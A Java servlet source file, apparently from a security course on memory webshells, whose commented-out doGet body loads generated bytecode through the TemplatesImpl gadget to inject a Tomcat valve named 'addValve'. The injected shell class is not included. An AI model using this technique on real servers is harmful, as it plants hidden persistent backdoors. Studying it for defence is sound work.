package lagou.edu.memshell;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import lagou.edu.memshell.TemplatesImpl_;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;
import java.util.Base64;

public class addMemShell extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        /*ClassPool pool = ClassPool.getDefault();
        try {
            CtClass ctClass = pool.get(addMemShells.class.getName());
            TemplatesImpl templates = new TemplatesImpl();
            TemplatesImpl_.setFieldValue(templates,"_name","addValve");
            TemplatesImpl_.setFieldValue(templates,"_bytecodes",new byte[][]{ctClass.toBytecode()});
            byte[] encode = Base64.getEncoder().encode(ctClass.toBytecode());
            System.out.println(new String(encode));
            TemplatesImpl_.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
            try {
                templates.newTransformer();
            } catch (TransformerConfigurationException e) {
                e.printStackTrace();
            }
        } catch (NotFoundException e) {
            e.printStackTrace();
        } catch (CannotCompileException e) {
            e.printStackTrace();
        }
*/
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException, ServletException {
        this.doGet(req, resp);
    }
}
